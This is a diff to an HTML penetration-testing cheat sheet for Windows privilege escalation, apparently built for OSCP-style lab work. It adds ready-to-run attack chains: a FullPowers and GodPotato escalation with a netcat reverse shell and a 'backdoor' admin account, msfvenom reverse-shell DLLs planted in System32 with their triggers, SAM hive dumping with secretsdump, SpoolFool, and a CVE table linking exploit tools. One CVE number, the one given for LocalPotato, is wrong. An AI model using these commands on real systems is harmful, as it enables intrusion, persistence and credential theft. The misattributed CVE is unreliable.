@@ -544,6 +544,7 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
       <a class="sb-item" href="#win-enum-scripts"><span class="num">7.13</span>Enum Scripts<span class="dot" data-sec="win-enum-scripts" onclick="cycleProgress(event,'win-enum-scripts')"></span></a>
       <a class="sb-item" href="#win-potatoes"><span class="num">7.14</span>&#129364; Potatoes<span class="dot" data-sec="win-potatoes" onclick="cycleProgress(event,'win-potatoes')"></span></a>
       <a class="sb-item" href="#win-exploits"><span class="num">7.15</span>Token Exploits<span class="dot" data-sec="win-exploits" onclick="cycleProgress(event,'win-exploits')"></span></a>
+      <a class="sb-item" href="#win-kernel-cves"><span class="num">7.15b</span>&#128300; Win Kernel CVEs<span class="dot" data-sec="win-kernel-cves" onclick="cycleProgress(event,'win-kernel-cves')"></span></a>
       <a class="sb-item" href="#win-uac"><span class="num">7.16</span>UAC Bypass<span class="dot" data-sec="win-uac" onclick="cycleProgress(event,'win-uac')"></span></a>
       <a class="sb-item" href="#win-lsass"><span class="num">7.17</span>LSASS Dump<span class="dot" data-sec="win-lsass" onclick="cycleProgress(event,'win-lsass')"></span></a>
       <a class="sb-item" href="#win-credmgr"><span class="num">7.18</span>Cred Manager<span class="dot" data-sec="win-credmgr" onclick="cycleProgress(event,'win-credmgr')"></span></a>
@@ -1038,6 +1039,26 @@ $type[0]::EnablePrivilege() 2>&amp;&amp;1</pre></div>
 <tr><td><code>SeAuditPrivilege</code></td><td class="impact-threat">THREAT</td><td>Write fake events to Security log to fool auditing</td></tr>
 </tbody>
 </table></div>
+</div>
+
+<div class="subsection"><div class="subsection-title">&#9888; Service Account Detected? Run FullPowers First</div>
+<div class="callout callout-danger">
+<strong>&#9888; LOCAL SERVICE / NETWORK SERVICE — SeImpersonate is stripped by default</strong>
+IIS AppPool, MSSQL, and other service accounts run as <code>NT AUTHORITY\LOCAL SERVICE</code> or <code>NETWORK SERVICE</code> and have SeImpersonatePrivilege <strong>removed</strong> from the token at runtime. Potatoes will fail silently. Run FullPowers first to restore all default privileges before attempting any potato exploit.
+</div>
+<div class="cmd-wrap"><div class="cmd-label">Detect — am I a service account?</div>
+<pre class="cmd">whoami
+# If output is: NT AUTHORITY\LOCAL SERVICE  or  NT AUTHORITY\NETWORK SERVICE → run FullPowers first</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Restore stripped privileges with FullPowers</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe -Outfile {{WPATH}}\FullPowers.exe
+{{WPATH}}\FullPowers.exe -c "{{WPATH}}\GodPotato-NET4.exe -cmd cmd" -z</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">{{WPATH}}\FullPowers.exe -c "{{WPATH}}\GodPotato-NET4.exe -cmd \"net user backdoor Pass123! /add && net localgroup administrators backdoor /add\""</code> — add admin user</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">{{WPATH}}\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd" -z</code> — reverse shell with full privs</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">{{WPATH}}\FullPowers.exe -x</code> — show extended privilege set after restore</div>
+</div>
+<div class="callout callout-tip"><strong>&#128161; One-liner shortcut (when you know you're a service account):</strong>
+After FullPowers re-enables SeImpersonate, any potato works: <code>FullPowers.exe -c "GodPotato-NET4.exe -cmd whoami"</code> — if output is <code>nt authority\system</code> you're done.</div>
 </div>
 
 <div class="notes-toggle" onclick="toggleNotes('win-privs')">&#128221; Notes</div>
@@ -2160,17 +2181,133 @@ tasklist /fi "IMAGENAME eq lsass.exe"</pre></div>
 <pre class="cmd">powershell -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\lsass.dmp full"</pre></div>
 </div>
 
-<div class="subsection"><div class="subsection-title">SeManageVolumePrivilege Abuse</div>
-<div class="cmd-wrap"><div class="cmd-label">Detect</div>
-<pre class="cmd">whoami /priv | findstr SeManageVolume</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">Step 1: Run the exploit to gain write access to C:\</div>
-<pre class="cmd">{{WPATH}}\SeManageVolumeExploit.exe</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">Step 2: Create malicious DLL on Kali</div>
-<pre class="cmd">msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o tzres.dll</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">Step 3: Transfer DLL to target</div>
+<div class="subsection"><div class="subsection-title">SeManageVolumePrivilege Abuse — Full Attack Chain</div>
+<div class="callout callout-tip"><strong>&#128161; Seen on PG Practice "Access" box.</strong> svc_mssql and other backup/volume service accounts frequently hold this privilege. It grants full DACL modification rights on the C:\ volume root — enough to plant a DLL in any System32 subdirectory.</div>
+<div class="pipeline">
+
+<div class="pipe-step pipe-detect">
+<span class="pipe-step-label">1. DETECT — confirm privilege is present</span>
+<div class="cmd-wrap"><div class="cmd-label">Check for SeManageVolumePrivilege</div>
+<pre class="cmd">whoami /priv | findstr SeManageVolume
+# Enabled or Disabled — both work. Disabled = enable with FullPowers first.</pre></div>
+</div>
+
+<div class="pipe-step pipe-kali">
+<span class="pipe-step-label">2. TRANSFER exploit binary from Kali</span>
+<div class="cmd-wrap"><div class="cmd-label">Download SeManageVolumeExploit.exe to target</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SeManageVolumeExploit.exe -Outfile {{WPATH}}\sme.exe</pre></div>
+<div class="alts"><div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/SeManageVolumeExploit.exe {{WPATH}}\sme.exe</code> — CMD</div></div>
+</div>
+
+<div class="pipe-step pipe-exploit">
+<span class="pipe-step-label">3. EXPLOIT — grant Everyone:FullControl on C:\</span>
+<div class="cmd-wrap"><div class="cmd-label">Run the exploit (no admin required)</div>
+<pre class="cmd">{{WPATH}}\sme.exe
+# Output: "Took ownership of C:\ — Everyone:FullControl granted"
+# Verify: icacls C:\</pre></div>
+</div>
+
+<div class="pipe-step pipe-kali">
+<span class="pipe-step-label">4. GENERATE malicious DLL on Kali</span>
+<div class="cmd-wrap"><div class="cmd-label">Option A — PrintConfig.dll (triggered via PrintNotify CLSID)</div>
+<pre class="cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o PrintConfig.dll</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Option B — tzres.dll (triggered via systeminfo)</div>
+<pre class="cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o tzres.dll</pre></div>
+</div>
+
+<div class="pipe-step pipe-exploit">
+<span class="pipe-step-label">5. PLACE the DLL on the target</span>
+<div class="cmd-wrap"><div class="cmd-label">For PrintConfig.dll path</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">For tzres.dll path</div>
 <pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">Step 4: Trigger payload</div>
-<pre class="cmd">systeminfo</pre></div>
+</div>
+
+<div class="pipe-step pipe-verify">
+<span class="pipe-step-label">6. LISTEN on Kali</span>
+<div class="cmd-wrap"><div class="cmd-label">Start listener before triggering</div>
+<pre class="cmd">nc -lvnp {{RPORT}}</pre></div>
+</div>
+
+<div class="pipe-step pipe-exploit">
+<span class="pipe-step-label">7. TRIGGER — choose method based on DLL placed</span>
+<div class="cmd-wrap"><div class="cmd-label">Trigger A — PrintNotify via CLSID (PrintConfig.dll)</div>
+<pre class="cmd">$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+$object = [Activator]::CreateInstance($type)</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Trigger B — systeminfo (tzres.dll)</div>
+<pre class="cmd">systeminfo
+# Loads wbem\tzres.dll as NetworkService context → shell callback</pre></div>
+</div>
+
+</div>
+
+<div class="subsection"><div class="subsection-title">Alternative DLL Trigger Paths</div>
+<div class="callout callout-info"><strong>&#128161; Multiple trigger paths exist.</strong> After SeManageVolumeExploit grants full C:\ write, you can plant a DLL in many locations. Choose based on which services are running and what context you need.</div>
+<div class="tbl-wrap"><table>
+<thead><tr><th>DLL Path</th><th>Trigger Method</th><th>Runs As</th><th>Reboot?</th></tr></thead>
+<tbody>
+<tr>
+  <td><code>C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll</code></td>
+  <td>PowerShell: <code>$type=[Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}"); [Activator]::CreateInstance($type)</code></td>
+  <td><span class="impact-admin">SYSTEM</span></td>
+  <td>No</td>
+</tr>
+<tr>
+  <td><code>C:\Windows\System32\wbem\tzres.dll</code></td>
+  <td>Run <code>systeminfo</code></td>
+  <td>NetworkService</td>
+  <td>No</td>
+</tr>
+<tr>
+  <td><code>C:\Windows\System32\wbem\wbemcomn.dll</code></td>
+  <td>Restart IP Helper service: <code>sc stop iphlpsvc &amp;&amp; sc start iphlpsvc</code></td>
+  <td><span class="impact-admin">SYSTEM</span></td>
+  <td>No</td>
+</tr>
+<tr>
+  <td><code>C:\Windows\System32\wbem\dxgi.dll</code></td>
+  <td>Windows Security → check for protection update</td>
+  <td><span class="impact-admin">SYSTEM</span></td>
+  <td>No</td>
+</tr>
+<tr>
+  <td><code>C:\Windows\System32\wlbsctrl.dll</code></td>
+  <td><code>sc stop IKEEXT &amp;&amp; sc start IKEEXT</code></td>
+  <td><span class="impact-admin">SYSTEM</span></td>
+  <td>Needs IKEEXT running</td>
+</tr>
+<tr>
+  <td><code>C:\Windows\System32\ualapi.dll</code></td>
+  <td>Spooler service restart: <code>sc stop spooler &amp;&amp; sc start spooler</code></td>
+  <td><span class="impact-admin">SYSTEM</span></td>
+  <td>No</td>
+</tr>
+<tr>
+  <td><code>C:\Windows\System32\phoneinfo.dll</code></td>
+  <td>Windows Problem Reporting (WER)</td>
+  <td><span class="impact-admin">SYSTEM</span></td>
+  <td>No (@jonasLyk)</td>
+</tr>
+<tr>
+  <td><code>C:\Windows\System32\wpcoreutil.dll</code></td>
+  <td>Start Windows Insider via <code>wisvc</code> service</td>
+  <td><span class="impact-admin">SYSTEM</span></td>
+  <td>No</td>
+</tr>
+</tbody>
+</table></div>
+<div class="cmd-wrap"><div class="cmd-label">Quick check — which triggerable services are running?</div>
+<pre class="cmd">sc query IKEEXT | findstr STATE
+sc query spooler | findstr STATE
+sc query iphlpsvc | findstr STATE
+sc query wisvc | findstr STATE</pre></div>
+</div>
+
+<div class="callout callout-tip">
+<strong>&#128279; Resources:</strong>
+<br>Tool: <a href="https://github.com/CsEnox/SeManageVolumeExploit" target="_blank">github.com/CsEnox/SeManageVolumeExploit</a>
+<br>Writeup (Access box): <a href="https://motasemhamdan.medium.com/active-directory-pentesting-offensive-security-proving-grounds-access-writeup-ddf4f3c6fcb9" target="_blank">motasemhamdan.medium.com/access-writeup</a>
+</div>
 </div>
 
 <div class="subsection"><div class="subsection-title">SeRestorePrivilege Abuse</div>
@@ -2256,6 +2393,172 @@ net localgroup administrators pwned  # verify</pre></div>
 
 <div class="notes-toggle" onclick="toggleNotes('win-exploits')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-win-exploits" onchange="saveNote('win-exploits',this.value)" placeholder="Add your notes here..."></textarea>
+</section>
+
+<!-- ── 7.15b WINDOWS KERNEL CVEs ─────────────────────────────── -->
+<section class="section" id="win-kernel-cves">
+<div class="section-header">
+  <div><div class="section-num">7.15b</div><div class="section-title">&#128300; Windows Kernel Exploit Reference</div>
+  <div class="section-subtitle">wesng workflow + quick-reference CVE table — paste systeminfo into the Parse button for auto-detection</div></div>
+  <div class="badges"><span class="badge badge-exploit">EXPLOIT</span><span class="badge badge-enum">CVE</span></div>
+</div>
+
+<div class="callout callout-tip"><strong>&#128161; Use the Parse button (top bar) first.</strong> Paste full <code>systeminfo</code> output into the SI Parser — it auto-matches CVEs and checks hotfixes. This section is a quick manual reference and wesng workflow for when you want command-line verification.</div>
+
+<div class="subsection"><div class="subsection-title">Step 1 — Get systeminfo on Target</div>
+<div class="cmd-wrap"><div class="cmd-label">Run on target, save to file</div>
+<pre class="cmd">systeminfo
+systeminfo > C:\Users\Public\sysinfo.txt</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Transfer to Kali via your HTTP server or SMB</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/sysinfo.txt -Outfile {{WPATH}}\sysinfo.txt  # wrong direction
+# Correct: exfil from target to Kali
+Invoke-WebRequest -Uri "http://{{KALI_IP}}:{{PORT}}/upload" -Method Post -InFile C:\Users\Public\sysinfo.txt
+# Or: just copy the output and paste into the Parse button</pre></div>
+</div>
+
+<div class="subsection"><div class="subsection-title">Step 2 — wesng Workflow on Kali</div>
+<div class="callout callout-info"><strong>wesng</strong> = Windows Exploit Suggester Next Generation. Feed it the raw systeminfo output and it returns CVEs filtered by exploit availability.</div>
+<div class="cmd-wrap"><div class="cmd-label">Install / update wesng</div>
+<pre class="cmd">git clone https://github.com/bitsadmin/wesng.git
+python3 wesng/wes.py --update</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Run against saved systeminfo output</div>
+<pre class="cmd">python3 wesng/wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only
+# Filter to specific severity:
+python3 wesng/wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only --severity Important</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Cross-reference with Watson on target (no outbound net needed)</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/Watson.exe -Outfile {{WPATH}}\Watson.exe
+{{WPATH}}\Watson.exe</pre></div>
+</div>
+
+<div class="subsection"><div class="subsection-title">Quick Reference — Top Windows Kernel / LPE CVEs</div>
+<div class="tbl-wrap"><table>
+<thead><tr><th>CVE</th><th>Name</th><th>Builds Affected</th><th>Tool</th><th>Patch KB</th></tr></thead>
+<tbody>
+<tr>
+  <td><code>CVE-2021-1675</code></td>
+  <td class="impact-admin">PrintNightmare LPE</td>
+  <td>14393–22000 (Win10 all, Srv2016/2019)</td>
+  <td><a href="https://github.com/calebstewart/CVE-2021-1675" target="_blank">SharpPrintNightmare</a></td>
+  <td>KB5004945</td>
+</tr>
+<tr>
+  <td><code>CVE-2020-0796</code></td>
+  <td class="impact-admin">SMBGhost</td>
+  <td>18362 / 18363 / 19041</td>
+  <td><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank">chompie1337 PoC</a></td>
+  <td>KB4551762</td>
+</tr>
+<tr>
+  <td><code>CVE-2021-36934</code></td>
+  <td class="impact-admin">HiveNightmare / SeriousSAM</td>
+  <td>19041–19044 (Win10 20H1–21H2)</td>
+  <td><a href="https://github.com/GossiTheDog/HiveNightmare" target="_blank">GossiTheDog/HiveNightmare</a></td>
+  <td>KB5005010</td>
+</tr>
+<tr>
+  <td><code>CVE-2022-21999</code></td>
+  <td class="impact-admin">SpoolFool</td>
+  <td>19041–19044, 17763, 14393</td>
+  <td><a href="https://github.com/ly4k/SpoolFool" target="_blank">ly4k/SpoolFool</a></td>
+  <td>KB5010342</td>
+</tr>
+<tr>
+  <td><code>CVE-2022-26923</code></td>
+  <td class="impact-admin">Certifried (ADCS)</td>
+  <td>19041–19043, 17763, 14393</td>
+  <td><a href="https://github.com/ly4k/Certifried" target="_blank">ly4k/Certifried</a></td>
+  <td>KB5014754</td>
+</tr>
+<tr>
+  <td><code>CVE-2023-21608</code></td>
+  <td class="impact-admin">LocalPotato</td>
+  <td>19041–19045, 22000, 22621</td>
+  <td><a href="https://github.com/decoder-it/LocalPotato" target="_blank">decoder-it/LocalPotato</a></td>
+  <td>KB5022282</td>
+</tr>
+<tr>
+  <td><code>CVE-2023-28252</code></td>
+  <td class="impact-admin">CLFS LPE (Nokoyawa)</td>
+  <td>19041–19045, 22000, 22621, 17763</td>
+  <td><a href="https://github.com/fortra/CVE-2023-28252" target="_blank">fortra/CVE-2023-28252</a></td>
+  <td>KB5025221</td>
+</tr>
+<tr>
+  <td><code>CVE-2024-21338</code></td>
+  <td class="impact-admin">appid.sys LPE (PPL bypass)</td>
+  <td>19041–19045, 22000, 22621</td>
+  <td><a href="https://github.com/varwara/CVE-2024-21338" target="_blank">varwara/CVE-2024-21338</a></td>
+  <td>KB5034763</td>
+</tr>
+<tr>
+  <td><code>CVE-2019-1458</code></td>
+  <td class="impact-high">WizardOpium</td>
+  <td>17763, 17134, 16299, 15063, 14393, 10586, 10240</td>
+  <td><a href="https://github.com/unamer/CVE-2019-1458" target="_blank">unamer/CVE-2019-1458</a></td>
+  <td>KB4530684</td>
+</tr>
+<tr>
+  <td><code>CVE-2019-0708</code></td>
+  <td class="impact-admin">BlueKeep (RDP RCE)</td>
+  <td>9600 (Win8.1/Srv2012R2), 7601 (Win7)</td>
+  <td>Metasploit: exploit/windows/rdp/cve_2019_0708_bluekeep_rce</td>
+  <td>KB4499175</td>
+</tr>
+<tr>
+  <td><code>CVE-2017-0144</code></td>
+  <td class="impact-admin">EternalBlue / MS17-010</td>
+  <td>7601, 9200, 9600 (Win7/Srv2008R2/Srv2012)</td>
+  <td><a href="https://github.com/3ndG4me/AutoBlue-MS17-010" target="_blank">AutoBlue-MS17-010</a></td>
+  <td>KB4012212</td>
+</tr>
+<tr>
+  <td><code>CVE-2016-3225</code></td>
+  <td class="impact-high">MS16-075 Hot Potato</td>
+  <td>10240, 9600, 9200, 7601</td>
+  <td><a href="https://github.com/foxglovesec/Potato" target="_blank">foxglovesec/Potato</a></td>
+  <td>KB3164038</td>
+</tr>
+<tr>
+  <td><code>CVE-2023-29360</code></td>
+  <td class="impact-admin">Kernel LPE (TPM)</td>
+  <td>19041–19045, 22000, 22621</td>
+  <td><a href="https://github.com/Wh04m1001/CVE-2023-29360" target="_blank">Wh04m1001/CVE-2023-29360</a></td>
+  <td>KB5027215</td>
+</tr>
+</tbody>
+</table></div>
+</div>
+
+<div class="subsection"><div class="subsection-title">HiveNightmare / SeriousSAM — CVE-2021-36934</div>
+<div class="callout callout-warn"><strong>&#9888; No exploit binary needed.</strong> Builds 19041–19044 have world-readable SAM/SECURITY/SYSTEM hives. Any local user can dump them directly.</div>
+<div class="cmd-wrap"><div class="cmd-label">Check if vulnerable (any user can read SAM)</div>
+<pre class="cmd">icacls C:\Windows\System32\config\SAM
+# If "BUILTIN\Users:(I)(RX)" → VULNERABLE</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Copy hives as regular user (no tools needed)</div>
+<pre class="cmd">reg save HKLM\SAM C:\Users\Public\SAM
+reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
+reg save HKLM\SECURITY C:\Users\Public\SECURITY</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Alternative — from Volume Shadow Copy (also readable)</div>
+<pre class="cmd">vssadmin list shadows
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Users\Public\SAM</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Dump hashes on Kali</div>
+<pre class="cmd">impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL</pre></div>
+</div>
+
+<div class="subsection"><div class="subsection-title">SpoolFool — CVE-2022-21999</div>
+<div class="cmd-wrap"><div class="cmd-label">Detect — check Spooler running + patch absent</div>
+<pre class="cmd">sc query spooler | findstr RUNNING
+systeminfo | findstr KB5010342
+# Spooler RUNNING + no KB5010342 → likely vulnerable</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Exploit</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SpoolFool.exe -Outfile {{WPATH}}\SpoolFool.exe
+{{WPATH}}\SpoolFool.exe -dll {{WPATH}}\evil.dll</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Generate DLL on Kali</div>
+<pre class="cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o evil.dll</pre></div>
+</div>
+
+<div class="notes-toggle" onclick="toggleNotes('win-kernel-cves')">&#128221; Notes</div>
+<textarea class="notes-area" id="notes-win-kernel-cves" onchange="saveNote('win-kernel-cves',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
 
 <!-- ── 7.16 UAC BYPASS ───────────────────────────────────────── -->
@@ -6689,17 +6992,65 @@ const WIN_VULNS = [
    desc:'Load vulnerable signed driver (Capcom.sys) → SYSTEM via ExploitCapcom.',
    cond:'whoami /priv shows SeLoadDriverPrivilege'},
   {name:'PrintNightmare LPE',cve:'CVE-2021-1675',type:'cve',min:14393,max:22000,
-   patchKBs:['KB5004945','KB5004946','KB5004947','KB5004948','KB5004960'],sev:'c',section:'win-exploits',
+   patchKBs:['KB5004945','KB5004946','KB5004947','KB5004948','KB5004960'],sev:'c',section:'win-kernel-cves',
    desc:'Print Spooler AddPrinterDriver LPE — July 2021 patch. Spooler must be running.',
+   tool:'SharpPrintNightmare / Invoke-Nightmare',
+   link:'https://github.com/calebstewart/CVE-2021-1675',
    cond:'Spooler running (sc query spooler) + none of July 2021 patch KBs installed'},
-  {name:'CVE-2023-29360',cve:'CVE-2023-29360',type:'cve',min:19041,max:22631,
-   patchKBs:['KB5027215'],sev:'h',section:'win-exploits',
-   desc:'Kernel LPE — June 2023 patch.',
+  {name:'CVE-2023-29360 Kernel LPE',cve:'CVE-2023-29360',type:'cve',min:19041,max:22631,
+   patchKBs:['KB5027215'],sev:'h',section:'win-kernel-cves',
+   desc:'Kernel LPE via Windows TPM driver — June 2023 patch.',
+   tool:'Wh04m1001/CVE-2023-29360',
+   link:'https://github.com/Wh04m1001/CVE-2023-29360',
    cond:'No KB5027215'},
-  {name:'EternalBlue',cve:'MS17-010',type:'cve',min:7601,max:14393,
-   patchKBs:['KB4012212','KB4012215','KB4012213','KB4012214'],sev:'c',section:'win-exploits',
+  {name:'EternalBlue / MS17-010',cve:'CVE-2017-0144',type:'cve',min:7601,max:14393,
+   patchKBs:['KB4012212','KB4012215','KB4012213','KB4012214'],sev:'c',section:'win-kernel-cves',
    desc:'SMBv1 RCE — should be patched everywhere but still on old OSCP boxes.',
+   tool:'AutoBlue-MS17-010',
+   link:'https://github.com/3ndG4me/AutoBlue-MS17-010',
    cond:'nmap --script smb-vuln-ms17-010 | grep VULNERABLE'},
+  {name:'SMBGhost',cve:'CVE-2020-0796',type:'cve',min:18362,max:19041,
+   patchKBs:['KB4551762'],sev:'c',section:'win-kernel-cves',
+   desc:'SMBv3 buffer overflow LPE — affects Win10 1903/1909/2004. No auth needed for LPE.',
+   tool:'chompie1337/SMBGhost_RCE_PoC',
+   link:'https://github.com/chompie1337/SMBGhost_RCE_PoC',
+   cond:'Build 18362/18363/19041 + no KB4551762'},
+  {name:'HiveNightmare / SeriousSAM',cve:'CVE-2021-36934',type:'cve',min:19041,max:19044,
+   patchKBs:['KB5005010'],sev:'h',section:'win-kernel-cves',
+   desc:'World-readable SAM/SECURITY/SYSTEM hives — any local user reads them directly. No tools needed.',
+   tool:'reg save HKLM\\SAM + secretsdump',
+   link:'https://github.com/GossiTheDog/HiveNightmare',
+   cond:'icacls C:\\Windows\\System32\\config\\SAM shows BUILTIN\\Users:(RX)'},
+  {name:'SpoolFool',cve:'CVE-2022-21999',type:'cve',min:14393,max:19044,
+   patchKBs:['KB5010342','KB5010345'],sev:'h',section:'win-kernel-cves',
+   desc:'Print Spooler LPE via arbitrary DLL load — Feb 2022 patch.',
+   tool:'ly4k/SpoolFool',
+   link:'https://github.com/ly4k/SpoolFool',
+   cond:'Spooler running + no KB5010342 or KB5010345'},
+  {name:'LocalPotato',cve:'CVE-2023-21608',type:'cve',min:19041,max:22621,
+   patchKBs:['KB5022282'],sev:'h',section:'win-potatoes',
+   desc:'NTLM reflection via local IPC — Jan 2023 patch. Works on modern Win10/11.',
+   tool:'decoder-it/LocalPotato',
+   link:'https://github.com/decoder-it/LocalPotato',
+   cond:'Build 19041–22621 + no KB5022282'},
+  {name:'WizardOpium',cve:'CVE-2019-1458',type:'cve',min:10240,max:17763,
+   patchKBs:['KB4530684'],sev:'h',section:'win-kernel-cves',
+   desc:'Win32k elevation of privilege — affects all Windows before Dec 2019 patch.',
+   tool:'unamer/CVE-2019-1458',
+   link:'https://github.com/unamer/CVE-2019-1458',
+   cond:'Build < 17763 (pre-1809) + no Dec 2019 patch'},
+  {name:'Certifried (ADCS)',cve:'CVE-2022-26923',type:'cve',min:14393,max:19043,
+   patchKBs:['KB5014754'],sev:'h',section:'win-adcs',
+   desc:'ADCS domain privilege escalation — May 2022 patch. Requires ADCS enrolled.',
+   tool:'ly4k/Certifried',
+   link:'https://github.com/ly4k/Certifried',
+   cond:'ADCS running + no KB5014754 + unprivileged domain account'},
+  {name:'CLFS LPE (Nokoyawa)',cve:'CVE-2023-28252',type:'cve',min:17763,max:22621,
+   patchKBs:['KB5025221'],sev:'c',section:'win-kernel-cves',
+   desc:'Windows Common Log File System driver LPE — April 2023 patch. Used in Nokoyawa ransomware.',
+   tool:'fortra/CVE-2023-28252',
+   link:'https://github.com/fortra/CVE-2023-28252',
+   cond:'Build 17763–22621 + no KB5025221'},
 ];
 
 const LIN_VULNS = [
@@ -6735,48 +7086,65 @@ function parseSI() {
 }
 
 function parseSIWindows(raw, out) {
-  const osM = raw.match(/OS Name:\s*(.+)/i);
-  const bldM = raw.match(/Build\s+(\d{4,5})/i);
-  const archM = raw.match(/System Type:\s*(.+)/i);
+  const osM = raw.match(/OS Name[:\s]+(.+)/i);
+  // robust build extraction: "OS Version: 10.0.19041" or "Build 19041" or bare build number
+  const bldM = raw.match(/OS Version[:\s]+[\d.]+\.([\d]+)/i)
+             || raw.match(/Build\s+(\d{4,5})/i)
+             || raw.match(/\b(19041|19042|19043|19044|19045|18363|18362|17763|16299|15063|14393|10586|10240|9600|9200|7601|20348|22000|22621|22631)\b/);
+  const archM = raw.match(/System Type[:\s]+(.+)/i);
   const build = bldM ? parseInt(bldM[1]) : null;
-  const kbs = new Set((raw.match(/KB\d{7}/gi) || []).map(k => k.toUpperCase()));
+  // catch both KB7-digit and KB6-digit
+  const kbs = new Set([...(raw.matchAll(/KB\d{6,7}/gi))].map(m => m[0].toUpperCase()));
+  const hotfixList = [...kbs].sort();
 
   let html = '<div class="si-os-header">';
   if (osM) html += `<div class="si-os-name">${escHtml(osM[1].trim())}</div>`;
-  if (build) html += `<div class="si-build">Build ${build} &mdash; ${WIN_BUILDS_MAP[build] || 'Unknown (check nearby builds)'}</div>`;
+  if (build) html += `<div class="si-build">Build ${build} &mdash; ${WIN_BUILDS_MAP[build] || 'Unknown OS version'}</div>`;
   if (archM) html += `<div class="si-arch">${escHtml(archM[1].trim())}</div>`;
+  if (hotfixList.length > 0) {
+    html += `<div class="si-arch" style="margin-top:6px;color:var(--text2)">Hotfixes installed (${hotfixList.length}): <span style="color:var(--cyan);font-size:11px">${hotfixList.slice(0,12).join(', ')}${hotfixList.length>12?' …':''}</span></div>`;
+  }
   html += '</div>';
 
   if (!build) {
-    out.innerHTML = html + '<div class="si-msg warn">&#9888; Could not extract build number. Make sure to paste the full systeminfo output (not just a snippet). Run: <code>systeminfo | findstr /i "Build"</code></div>';
+    out.innerHTML = html + '<div class="si-msg warn">&#9888; Could not extract build number. Paste the full systeminfo output. Quick extract: <code>systeminfo | findstr /i "OS Version\\|Build"</code></div>';
     return;
   }
 
-  let vulnN = 0, html2 = '<div class="si-vulns">';
-  WIN_VULNS.forEach(v => {
-    if (v.min > build || v.max < build) return;
-    const patched = v.patchKBs && v.patchKBs.some(kb => kbs.has(kb));
-    const cls = patched ? 'sv-patched' : 'sv-vuln';
-    if (!patched) vulnN++;
+  // sort: unpatched CVEs first, then by severity
+  const sevOrder = {c:0,h:1,m:2};
+  const relevant = WIN_VULNS
+    .filter(v => v.type === 'cve' && v.min <= build && v.max >= build)
+    .map(v => ({...v, patched: !!(v.patchKBs && v.patchKBs.some(kb => kbs.has(kb)))}))
+    .sort((a,b) => (a.patched - b.patched) || (sevOrder[a.sev]||2) - (sevOrder[b.sev]||2));
+
+  let vulnN = relevant.filter(v => !v.patched).length;
+  let html2 = '<div class="si-vulns">';
+  relevant.forEach(v => {
+    const cls = v.patched ? 'sv-patched' : 'sv-vuln';
     html2 += `<div class="si-card ${cls}">
       <div class="si-vtop">
         <span class="si-vname">${v.name}</span>
         ${v.cve ? `<span class="si-cve">${v.cve}</span>` : ''}
         <span class="si-stag s${v.sev}">${v.sev==='c'?'CRITICAL':v.sev==='h'?'HIGH':'MEDIUM'}</span>
-        <span class="si-vstatus">${patched ? '&#10003; PATCHED' : '&#9888; LIKELY VULNERABLE'}</span>
+        <span class="si-vstatus">${v.patched ? '&#10003; PATCHED' : '&#9888; UNPATCHED'}</span>
       </div>
       <div class="si-vdesc">${v.desc}</div>
-      <div class="si-vcond">Conditions: ${v.cond}</div>
+      <div class="si-vcond" style="font-size:11px;color:var(--text3);margin-bottom:3px">Conditions: ${v.cond}</div>
